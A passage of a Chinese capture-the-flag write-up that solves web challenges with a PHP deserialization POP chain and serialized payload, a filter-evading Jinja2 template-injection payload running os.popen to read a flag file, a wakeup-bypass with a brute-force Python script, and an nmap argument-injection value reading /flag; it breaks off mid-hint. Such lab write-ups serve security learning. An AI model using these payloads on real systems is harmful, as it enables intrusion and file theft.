class="hljs-string">&#x27;fun&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>应该是php原生类读文件，我们一步一步从终点反推：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&#x27;r&#x27;</span>) === <span class="hljs-string">&quot;loveyou&quot;</span>))<br></code></pre></td></tr></table></figure><p>这里可以用data伪协议进入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,bG92ZXlvdQ==<br></code></pre></td></tr></table></figure><p>然后需要密钥和她的名字：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$this</span>-&gt;hername,<span class="hljs-variable">$this</span>-&gt;key) === <span class="hljs-string">&#x27;vxvx&#x27;</span>) &#123;<br></code></pre></td></tr></table></figure><p>我们需要在另一部分去拿。</p><p>然后以上这些东西都在find这个方法里，我们需要进入这个方法，并且因为里面使用了$this，所以只能动态调用该方法，这个后面说。</p><p>找到唯一可以调用函数的地方：</p><p>useless类中有get方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$good</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$zhui</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$good</span>;  <br>        <span class="hljs-variable">$zhui</span>[<span class="hljs-variable">$good</span>]();  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而能触发get方法的是important类中的sleep方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;睡饱了，接着找！&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;power-&gt;seeyou;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在直接获取私有成员属性得时候，自动调用了这个__get()方法，这里的seeyou是私有属性，所以会调用get，进入get之后，$good就是触发get方法的属性名，即seeyou，所以get当中关键句就变成了</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">seeyou<span class="hljs-selector-attr">[seeyou]</span>();<br></code></pre></td></tr></table></figure><p>我们需要修改seeyou这个数组当中的seeyou的键值，从而调用find函数。</p><p>原来尝试过静态调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$seeyou</span>=[<span class="hljs-string">&quot;seeyou&quot;</span>=&gt;<span class="hljs-string">&quot;her::find&quot;</span>];<br></code></pre></td></tr></table></figure><p>但是不成功，只能动态调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$seeyou</span>=[<span class="hljs-string">&quot;seeyou&quot;</span>=&gt;[<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">her</span>(), <span class="hljs-string">&quot;find&quot;</span>]];<br></code></pre></td></tr></table></figure><p>接着回到链子，现在需要触发sleep方法，当序列化的时候会自动触发，在her类中有序列化函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;好累，好想睡一觉啊&lt;br&gt;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$this</span>-&gt;asd);<br>&#125;<br></code></pre></td></tr></table></figure><p>现在需要进入invoke方法，当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。在Me类中找到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;qwe;        <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$bb</span>();<br></code></pre></td></tr></table></figure><p>而wakeup会自动执行。</p><p>所以我们的pop链就出来了：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">new</span> Me<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>__wakeup<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span><span class="hljs-keyword">new</span> her<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>__invoke<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span><span class="hljs-keyword">new</span> important<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>__sleep<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span><span class="hljs-keyword">new</span> useless<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>__get<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span><span class="hljs-keyword">new</span> her<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>find()<br></code></pre></td></tr></table></figure><p>最终php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Me</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwe</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bro</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$secret</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">her</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$hername</span> = <span class="hljs-string">&#x27;momo&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;9&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$asd</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">important</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$power</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">useless</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$seeyou</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$YXX</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$seeyou</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;seeyou = <span class="hljs-variable">$seeyou</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Me</span>();<br><span class="hljs-variable">$b</span>-&gt;bro = &amp;<span class="hljs-variable">$b</span>-&gt;secret;<br><span class="hljs-variable">$b</span>-&gt;qwe = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">her</span>();<br><span class="hljs-variable">$b</span>-&gt;qwe-&gt;asd = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">important</span>();<br><span class="hljs-variable">$b</span>-&gt;qwe-&gt;asd-&gt;power = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">useless</span>([<span class="hljs-string">&quot;seeyou&quot;</span>=&gt;[<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">her</span>(), <span class="hljs-string">&quot;find&quot;</span>]]);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>最后是原生类读文件，当我们想要读取到某个文件时，我们就可以利用SplFileInfo或者SplFileObject类来对文件进行操作。这内置类也只能读取第一行，同样我们可以使用foreach把它们全部都打印出来。</p><p>但是这里我们可没有foreach函数可以用，只能读取文件名，所以尝试目录遍历</p><p><a href="https://blog.csdn.net/m0_62422842/article/details/125045832">https://blog.csdn.net/m0_62422842/article/details/125045832</a></p><p>我们用FilesystemIterator扫描一下当前目录第一个文件（只能第一个&#x3D;-&#x3D;）</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span>=/<span class="hljs-keyword">var</span>/www/html/</span><br>ctf=FilesystemIterator<br></code></pre></td></tr></table></figure><p>拿到一个文件名flag_my_baby.php ，打开康康，找到flag</p><p>SYC{jUHzFBdyEKq2lySHks}</p><p>最终payload：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">?user=C%3A13%3A%22ArrayIterator%22%3A366%3A%7Bx%3Ai%3A0%3BO%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&amp;<span class="hljs-keyword">file</span>=data:<span class="hljs-comment">//text/plain;base64,bG92ZXlvdQ==&amp;fun=/var/www/html/</span><br><br>POST：ctf=FilesystemIterator<br></code></pre></td></tr></table></figure><h2 id="klf-2-klf-3"><a href="#klf-2-klf-3" class="headerlink" title="klf_2&amp;klf_3"></a>klf_2&amp;klf_3</h2><p>klf_2的payload复制到klf_3里同样适用&#x3D;-&#x3D;</p><p>在&#x2F;robots.txt里找到&#x2F;secr3ttt</p><p><a href="https://xz.aliyun.com/t/9584">https://xz.aliyun.com/t/9584</a></p><p>这道题过滤了很多关键字，经过测试，留下一个列表可以让我们取用需要的字符</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> orglst = (&#123; &#125;|select|string|list) %&#125;</span><span class="language-xml">&#123;&#125;orglst&#125;&#125;</span><br><span class="language-xml">在这里取到下划线和空格</span><br></code></pre></td></tr></table></figure><p>可以通过下列语句构造关键字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% <span class="hljs-built_in">set</span> pon = dict(po=aa,pen=<span class="hljs-built_in">dd</span>)|<span class="hljs-built_in">join</span> %&#125;    <span class="hljs-comment"># popen</span><br></code></pre></td></tr></table></figure><p>直接上payload</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> po = dict(po=aa,p=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">             #pop</span><br><span class="language-xml">pop被过滤了，构造出pop后用|attr(po)代替 .pop</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> xhx = ((&#123; &#125;<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(po)(<span class="hljs-number">24</span>)<span class="hljs-punctuation">|</span>string) <span class="hljs-template-tag">%&#125;</span><span class="language-xml">      #_</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> kong = ((&#123; &#125;<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(po)(<span class="hljs-number">17</span>)<span class="hljs-punctuation">|</span>string) <span class="hljs-template-tag">%&#125;</span><span class="language-xml">     #空格</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> point = ((g<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(po)(<span class="hljs-number">6</span>)<span class="hljs-punctuation">|</span>string) <span class="hljs-template-tag">%&#125;</span><span class="language-xml">  //g是全局变量，代表flask这个实例 #.</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> claz= dict(cla=aa,ss=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#class</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> clazz=(xhx,xhx,claz,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">#__class__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> baz = dict(ba=aa,se=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#base</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bazz=(xhx,xhx,baz,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">#__base__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> subz = dict(subc=aa,lasses=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#subclasses</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> subzz=(xhx,xhx,subz,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">#__subclasses__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> getz= dict(geti=aa,tem=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#getitem</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> getzz=(xhx,xhx,getz,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">#__getitem__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> inz= dict(<span class="hljs-keyword">in</span>=aa,it=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#init</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> inzz=(xhx,xhx,inz,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">#__init__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> glo= dict(glo=aa,bals=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#globals</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> glob=(xhx,xhx,glo,xhx,xhx)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">#__globals__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> xi=()<span class="hljs-punctuation">|</span>attr(clazz)<span class="hljs-punctuation">|</span>attr(bazz)<span class="hljs-punctuation">|</span>attr(subzz)()<span class="hljs-punctuation">|</span>attr(getzz)(<span class="hljs-number">279</span>)<span class="hljs-punctuation">|</span>attr(inzz)<span class="hljs-punctuation">|</span>attr(glob)<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>attr(getzz)(<span class="hljs-number">69</span>) <span class="hljs-template-tag">%&#125;</span><span class="language-xml">       #/        //从另一个表里拿到斜杠</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> oz= dict(o=aa,s=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#os</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> pom= dict(po=aa,pen=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> re= dict(re=aa,ad=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#read</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ca= dict(c=aa,at=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#cat</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> f= dict(fl<span class="hljs-number">4</span>gf=aa,l<span class="hljs-number">4</span>gfl<span class="hljs-number">4</span>g=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">#fl4gfl4gfl4g</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> payload=(ca,kong,point,point,xi,point,point,xi,f)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">#cat ../../fl4gfl4gfl4g</span><br><span class="language-xml">&#123;&#125;()|attr(clazz)|attr(bazz)|attr(subzz)()|attr(getzz)(279)|attr(inzz)|attr(glob)|attr(getzz)(oz)|attr(pom)(payload)|attr(re)()&#125;&#125;</span><br><span class="language-xml">#().__class__.__base__.__subclasses__.__getitem__(279).__init__.__globals__.__getitem__(oz).popen(cat ../../fl4gfl4gfl4g).read()</span><br></code></pre></td></tr></table></figure><p>__getitem__(279)为[279]</p><p>SYC{YARCu1gP5RLkoNNwcI}</p><h2 id="Akane"><a href="#Akane" class="headerlink" title="Akane!"></a>Akane!</h2><p>这道题要我们猜测flag所在文件的名字，根据不同的回显，相当于盲注。</p><p>我们要一步一步猜测文件名，所以要绕过wakeup</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-variable">$b</span> <span class="hljs-operator">=</span> str_replace(<span class="hljs-string">&quot;Hoshino<span class="hljs-subst">\&quot;</span>:1&quot;</span>,<span class="hljs-string">&quot;Hoshino<span class="hljs-subst">\&quot;</span>:2&quot;</span>,<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p>调用call方法</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span>R<span class="hljs-function"><span class="hljs-title">uby</span>-&gt;</span>func(); <br></code></pre></td></tr></table></figure><p>php这边简单，看代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hoshino</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Ruby</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Idol</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Akane</span>=<span class="hljs-string">&#x27;glob:///var/www/html/The*.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$q</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Akane=<span class="hljs-variable">$q</span>;<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hoshino</span>();<br><span class="hljs-variable">$a</span>-&gt;Ruby= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Idol</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;Hoshino\&quot;:1&quot;</span>,<span class="hljs-string">&quot;Hoshino\&quot;:2&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p>这里让Akane的值为$argv[1]的值，可以通过外部终端传入，配合python脚本使用，</p><p>python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&#x27;https://j8mh5c6z3h7vvi33edzdfdmqa.node.game.sycsec.com/?tuizi=&#x27;</span><br><br><br>filename = <span class="hljs-string">&#x27;glob:///var/www/html/The&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>dic = string.ascii_letters+string.digits+<span class="hljs-string">&#x27;_-+.&#x27;</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>        file=filename+flag+i+<span class="hljs-string">&#x27;*.php&#x27;</span><br>        <span class="hljs-built_in">print</span>(file)<br>        read = os.popen(<span class="hljs-string">&#x27;php /home/yinyun/Documents/php文件/test.php &#x27;</span>+file).read()<br>        res = requests.get(url=url+read)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Kurokawa Akane&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>            flag+=i<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>爆出名字为：TheS4crEtF1AgFi1EByo2takuXX.php</p><p>SYC{qabhfOQdYBX0MYrA8q}</p><h2 id="scan-tool"><a href="#scan-tool" class="headerlink" title="scan_tool"></a>scan_tool</h2><p><a href="https://blog.csdn.net/weixin_44037296/article/details/110893526">https://blog.csdn.net/weixin_44037296/article/details/110893526</a></p><p><strong>考点</strong>：<code>nmap -oG 写入文件</code>、<code>-iL读取扫描文件</code>、<code>escapeshellarg</code>绕过</p><p>PHP中的<code>escapeshellarg()</code>函数会剔除不可见字符,这个特性可以用来绕过对<code>-iL</code>、<code>-oN</code>等参数的过滤。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ip</span>=<span class="hljs-string">&#x27; -i%faL /flag -o%faN 1.txt &#x27;</span><br></code></pre></td></tr></table></figure><p>然后看1.txt即可拿到flag</p><p>SYC{jvphuvHv43WbXRMoan}</p><h2 id="ezrfi"><a href="#ezrfi" class="headerlink" title="ezrfi"></a>ezrfi</h2><p>hint为：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">w<span class="hljs-number">5</span>YubyBvd<span class="hljs-number">08</span>gMHcwI<span class="hljs-name">G92</span>MCDDl<span class="hljs-symbol">ndvIE8</span>ubyAwLjAgMC<span class="hljs-number">5</span>vIMOWdjAgMHbDliBPdjAgT<span class="hljs-number">3</span>fDliBvLk<span class="hljs-number">8</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>TyAwXzAgMF<span class="hljs-number">9</span>PI<span 